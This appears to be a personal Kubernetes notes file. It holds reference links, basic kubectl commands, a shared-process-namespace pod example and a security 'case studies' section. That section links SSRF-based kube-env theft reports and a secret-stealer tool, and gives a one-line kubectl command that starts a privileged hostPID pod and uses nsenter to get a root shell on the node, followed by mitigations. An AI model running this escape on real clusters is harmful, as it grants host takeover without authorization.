# +

- https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.36/#api-overview
- https://github.com/kelseyhightower/kubernetes-the-hard-way
- https://training.linuxfoundation.org/training/introduction-to-kubernetes/
- https://samof76.space/kubernetes-in-anger.html
- https://matduggan.com/aws-eks/

- [GitHub \- kubeshark/kubeshark: eBPF\-powered network observability for Kubernetes\. Indexes L4/L7 traffic with full K8s context, decrypts TLS without keys\. Queryable by AI agents via MCP and humans via dashboard\. · GitHub](https://github.com/kubeshark/kubeshark)
- https://kubenomicon.com/

# lifecycle

- Test cluster: k3s with Deployment, Service, IngressRoute
- On OOMKilled check dmesg on container host

```bash
kubectl apply -f foo.yaml

kubectl get services
kubectl get pods --all-namespaces

kubectl delete pod 'foo' --grace-period=0

kubectl run -i --tty --image busybox foo --restart=Never --rm
```

# containers with same pid namespace

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: shared
spec:
  shareProcessNamespace: true
  containers:
  - name: 1
    image: busybox
    command: ["sh"]
    args: ["-c", "foo"]
    env:
    - name: CONTAINER_NAME
      value: 1
  - name: 2
    image: busybox
    env:
    - name: CONTAINER_NAME
      value: 2
```

```bash
# On container 1
ps
# USER		PID		COMMAND
# root		  6		sh -c -- foo

# List container 2 root directory
ls /proc/6/root
```

# case studies

### kube-env leaked via ssrf

- [SSRF in Exchange leads to ROOT access in all instances](https://hackerone.com/reports/341876)
- [Shopify’s $25k Bug Report, and the Cluster Takeover That Didn’t\.\.\. \- Greg Castle &amp; Shane Lawrence \- YouTube](https://www.youtube.com/watch?v=2XCm7vveU5A)
- [GitHub \- bgeesaman/kube\-env\-stealer: Automated GKE Kubelet Impersonation and Cluster Secret Stealer via kube\-env](https://github.com/bgeesaman/kube-env-stealer)

### root pid ns

```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
```

- Mitigations:
    - `PodSecurityPolicies`
    - `--allow-privileged=False` on kubelet
